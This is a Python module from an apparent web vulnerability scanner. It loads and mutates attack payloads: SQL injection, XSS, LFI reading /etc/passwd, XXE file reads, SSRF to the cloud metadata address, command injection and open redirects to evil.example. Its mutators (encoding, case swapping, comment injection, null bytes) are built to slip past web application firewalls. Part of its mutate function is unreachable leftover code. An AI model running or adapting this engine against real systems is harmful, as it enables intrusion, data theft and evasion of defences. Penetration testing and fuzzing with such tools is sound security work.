# core/payloads.py — payload loader + mutator engine
import random
from pathlib import Path

PAYLOAD_DIR = Path(__file__).parent.parent / "payloads"

# базовые встроенные (если файлов нет)
BUILTIN = {
    "sqli": ["'", "\"", "')--", "' OR '1'='1", "1' AND SLEEP(3)--"],
    "xss":  ["<script>alert(1)</script>", "\"><svg/onload=alert(1)>"],
    "lfi":  ["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
    "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
    "xxe":  ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'],
    "open_redirect": ["//evil.example", "https://evil.example"],
    "ssrf": ["http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/"],
    "cmd_injection": ["; id", "| id", "`id`", "$(id)"],
    "waf_bypass": ["/**/", "%00", "%0d%0a"],
}

FILES = {
    "sqli": ["sqli.txt","sqli_extra.txt","seclists_sqli.txt","seclists_sqli_quick.txt","seclists_sqli_all.txt"],
    "xss":  ["xss.txt","xss_extra.txt","seclists_xss.txt"],
    "lfi":  ["lfi.txt","seclists_lfi.txt"],
    "ssti": ["ssti.txt","ssti_extra.txt"],
    "xxe":  ["xxe.txt","seclists_xxe.txt"],
    "ssrf": ["ssrf.txt","seclists_ssrf.txt"],
    "open_redirect": ["open_redirect.txt","seclists_open_redirect.txt"],
    "cmd_injection": ["cmd_injection.txt"],
    "waf_bypass": ["waf_bypass.txt"],
    "ssi": ["ssi_injection.txt"],
}

_cache = {}

def load(kind: str) -> list[str]:
    if kind in _cache: return _cache[kind]
    out = []
    for fname in FILES.get(kind, []):
        p = PAYLOAD_DIR / fname
        if p.is_file():
            try:
                for line in p.read_text(encoding="utf-8", errors="ignore").splitlines():
                    s = line.strip()
                    if s and not s.startswith("#"):
                        out.append(s)
            except Exception:
                pass
    if not out:
        out = BUILTIN.get(kind, [])
    out = list(dict.fromkeys(out))  # dedupe, preserve order
    _cache[kind] = out
    return out


# ---- мутации ----

def _case_swap(s):
    return "".join(c.upper() if random.random() < 0.3 else c.lower() for c in s)

def _comment_inject(s):
    return s.replace(" ", "/**/")

def _url_encode(s):
    import urllib.parse
    return urllib.parse.quote(s, safe="")

def _double_url_encode(s):
    import urllib.parse
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")

def _whitespace_swap(s):
    return s.replace(" ", random.choice(["+","%20","%09","%0a","%0d","/**/"]))

def _html_entity(s):
    return s.replace("'", "&#39;").replace("\"", "&#34;").replace("<", "&lt;").replace(">", "&gt;")

def _hex_wrap(s):
    if "'" in s:
        return s.replace("'", "0x27")
    return s

def _null_byte(s):
    return s + "%00"

def _random_pad(s):
    return s + random.choice(["", "/*x*/", "-- -", "#", "%%", "/*!x*/"])

def _concat_split(s):
    # MySQL concat split: 'abc' -> CONCAT('a','b','c')
    return "CONCAT(" + ",".join(f"'{c}'" for c in s[:20]) + ")" if len(s) < 30 else s

MUTATORS = [
    _case_swap, _comment_inject, _url_encode, _double_url_encode,
    _whitespace_swap, _html_entity, _hex_wrap, _null_byte,
    _random_pad, _concat_split,
]

def mutate(payload, n=None, variants=None, base_first=True):
    """Backward-compat: accepts n= or variants=; delegates to core.mutator.mutate_param."""
    from core.mutator import mutate_param
    count = n if n is not None else (variants if variants is not None else 5)
    return mutate_param(payload, n=count, base_first=base_first)
    """Generate `variants` mutated versions of payload."""
    out = [payload]
    for _ in range(variants):
        f = random.choice(MUTATORS)
        try:
            m = f(payload)
            if m and m != payload and m not in out:
                out.append(m)
        except Exception:
            pass
    return out


def get(kind: str, limit: int | None = None, mutate_by: int = 0) -> list[str]:
    """
    get("sqli")               -> все базовые
    get("sqli", limit=500)    -> первые 500
    get("sqli", mutate_by=3)  -> каждый базовый + 3 мутации = x4 объём
    """
    base = load(kind)
    if limit:
        base = base[:limit]
    if mutate_by <= 0:
        return base
    out = []
    for p in base:
        out.extend(mutate(p, variants=mutate_by))
    return list(dict.fromkeys(out))


if __name__ == "__main__":
    import sys
    for kind in FILES:
        n = len(load(kind))
        m = len(get(kind, mutate_by=3))
        print(f"{kind:18s} base={n:5d}  mutated(x3)={m:6d}")
